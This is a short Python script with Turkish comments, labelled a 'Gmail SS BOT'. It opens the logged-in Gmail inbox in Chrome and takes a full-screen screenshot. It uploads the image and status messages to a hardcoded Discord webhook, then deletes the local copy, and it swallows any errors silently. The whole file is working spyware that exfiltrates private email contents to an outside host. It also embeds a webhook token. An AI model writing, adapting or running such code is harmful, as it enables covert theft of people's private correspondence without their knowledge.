import os
import time
import requests
import subprocess
import pyautogui

# ==========================================
# WEBHOOK BİLDİRİM URL'SI
# ==========================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"

def send_notification(message):
    try:
        payload = {"content": f"**[GMAIL SS BİLDİRİM]** {message}"}
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

def send_photo_to_webhook(photo_path):
    try:
        with open(photo_path, "rb") as f:
            files = {"file": f}
            payload = {"content": "📸 Gmail ekran görüntüsü:"}
            requests.post(WEBHOOK_URL, data=payload, files=files)
        send_notification("✅ Ekran görüntüsü webhook'a gönderildi!")
    except Exception as e:
        send_notification(f"❌ Gönderme hatası: {e}")

# ==========================================
# CHROME İLE GMAIL AÇ
# ==========================================
def open_gmail():
    try:
        # Chrome ile Gmail'i aç
        chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
        gmail_url = "https://mail.google.com/mail/u/0/"
        
        if os.path.exists(chrome_path):
            subprocess.Popen([chrome_path, gmail_url])
        else:
            subprocess.Popen(["start", gmail_url], shell=True)
        
        send_notification("🌐 Gmail açılıyor...")
        time.sleep(5)  # Sayfanın yüklenmesi için bekle
        return True
    except Exception as e:
        send_notification(f"❌ Gmail açma hatası: {e}")
        return False

# ==========================================
# EKRAN GÖRÜNTÜSÜ AL
# ==========================================
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("gmail_ss.png")
        send_notification("📸 Ekran görüntüsü alındı!")
        return "gmail_ss.png"
    except Exception as e:
        send_notification(f"❌ Ekran görüntüsü hatası: {e}")
        return None

# ==========================================
# ANA
# ==========================================
if __name__ == "__main__":
    send_notification("🚀 Gmail SS BOT BAŞLATILDI!")
    
    # Gmail aç
    open_gmail()
    
    # Ekran görüntüsü al
    ss = take_screenshot()
    
    # Webhook'a gönder
    if ss:
        send_photo_to_webhook(ss)
        os.remove(ss)
    
    send_notification("✅ İşlem tamamlandı!")
